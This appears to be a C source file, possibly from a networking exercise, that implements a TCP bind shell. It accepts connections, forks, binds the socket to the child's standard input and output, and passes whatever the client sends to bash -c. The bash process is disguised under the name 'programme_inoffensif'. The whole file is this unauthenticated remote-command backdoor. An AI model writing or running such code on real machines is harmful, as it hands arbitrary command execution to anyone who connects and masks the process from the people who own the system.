#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "utils.h"
#include "header.h"
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>


int main(int argc, char *argv[]) {
    int sockfd = ssocket();
    sbind(SERVER_PORT, sockfd);
    slisten(sockfd, BACKLOG);
    

    while (1) {
        int newsockfd = saccept(sockfd);
        printf("Client connecté\n");

        char buffer[BUFFER_SIZE];

        pid_t pid = sfork();
        if (pid==0) {
            dup2(newsockfd, STDOUT_FILENO);  
            dup2(newsockfd, STDERR_FILENO);
            dup2(newsockfd, STDIN_FILENO);
            ssize_t n = sread(newsockfd, buffer, sizeof(buffer) - 1);
            if (n > 0) {
            buffer[n] = '\0';
        }

            execlp("bash", "programme_inoffensif", "-c", buffer, NULL);

        }

        if (newsockfd < 0) {
            perror("open");
            exit(1);
        }

        

        
        sclose(newsockfd);

        

        }

    

       sclose(sockfd);
    return 0;
   }

    